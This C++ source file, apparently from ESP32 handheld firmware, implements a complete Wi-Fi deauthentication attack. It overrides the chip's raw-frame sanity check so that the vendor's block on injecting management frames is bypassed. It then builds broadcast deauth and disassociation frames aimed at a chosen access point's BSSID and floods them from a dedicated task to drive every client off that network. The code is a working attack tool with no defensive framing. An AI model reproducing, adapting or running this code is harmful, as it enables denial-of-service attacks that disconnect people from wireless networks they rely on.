#include "deauther.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include <string.h>

// ---------------------------------------------------------------------------
// IDF 5.x blocks esp_wifi_80211_tx() from sending management frames (deauth,
// disassoc, auth, assoc) via an internal sanity check. That check is a WEAK
// symbol, so providing our own strong definition that always passes re-enables
// raw injection. This is the standard override used by ESP32 WiFi tools and is
// the reason the deauth transmitter works at all on this Arduino-ESP32 core.
// ---------------------------------------------------------------------------
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3)
{
    (void)arg; (void)arg2; (void)arg3;
    return 0;
}

// 802.11 deauth frame template. addr1 = broadcast (hit every associated client),
// addr2/addr3 = the AP BSSID. Reason 7 = "class-3 frame from nonassociated STA".
static uint8_t s_deauth[26] = {
    0xC0, 0x00, 0x00, 0x00,             // frame control (deauth) + duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // addr1 dst  (broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // addr2 src  (BSSID, filled at start)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // addr3 bssid (filled at start)
    0x00, 0x00,                         // seq
    0x07, 0x00,                         // reason 7
};
// Disassociation frame — same shape, subtype 0xA0, reason 8 (STA leaving).
static uint8_t s_disassoc[26] = {
    0xA0, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00,
    0x08, 0x00,
};

static TaskHandle_t   s_task = nullptr;
static volatile bool  s_run  = false;
static volatile uint32_t s_sent = 0;
static uint8_t        s_bssid[6];
static uint8_t        s_channel = 1;
static wifi_mode_t    s_prev_mode = WIFI_MODE_NULL;

static void deauth_task(void *)
{
    while (s_run) {
        // Re-assert the channel each pass — cheap, and it recovers if anything
        // else nudged the radio off the target channel.
        esp_wifi_set_channel(s_channel, WIFI_SECOND_CHAN_NONE);
        for (int i = 0; i < 8 && s_run; i++) {
            esp_wifi_80211_tx(WIFI_IF_STA, s_deauth,   sizeof(s_deauth),   false);
            esp_wifi_80211_tx(WIFI_IF_STA, s_disassoc, sizeof(s_disassoc), false);
            s_sent += 2;
        }
        vTaskDelay(pdMS_TO_TICKS(15));
    }
    s_task = nullptr;
    vTaskDelete(nullptr);
}

bool deauther_start(const uint8_t bssid[6], uint8_t channel)
{
    if (s_run) return true;

    memcpy(s_bssid, bssid, 6);
    s_channel = (channel >= 1 && channel <= 13) ? channel : 1;
    s_sent = 0;

    // Stamp the BSSID into addr2/addr3 of both frame templates.
    memcpy(s_deauth   + 10, s_bssid, 6);
    memcpy(s_deauth   + 16, s_bssid, 6);
    memcpy(s_disassoc + 10, s_bssid, 6);
    memcpy(s_disassoc + 16, s_bssid, 6);

    s_prev_mode = WiFi.getMode();
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(s_channel, WIFI_SECOND_CHAN_NONE);

    s_run = true;
    // Pin to the WiFi core (0) so the TX loop sits next to the WiFi driver and
    // never fights the LVGL/loop task on core 1 for the CPU.
    xTaskCreatePinnedToCore(deauth_task, "deauth", 4096, nullptr, 1, &s_task, 0);
    return true;
}

void deauther_stop()
{
    if (s_run) {
        s_run = false;
        // Let the task observe the flag and self-delete (max ~100 ms).
        for (int i = 0; i < 20 && s_task; i++) vTaskDelay(pdMS_TO_TICKS(5));
    }

    esp_wifi_set_promiscuous(false);

    // Return the radio to how we found it, matching analyze_screen's teardown so
    // the clock-face WiFi indicator reflects reality.
    if (s_prev_mode == WIFI_MODE_NULL) {
        WiFi.mode(WIFI_OFF);
        esp_wifi_stop();
        esp_wifi_deinit();
    } else {
        WiFi.mode(s_prev_mode);
    }
    s_prev_mode = WIFI_MODE_NULL;
}

bool     deauther_is_running()  { return s_run; }
uint32_t deauther_frames_sent() { return s_sent; }
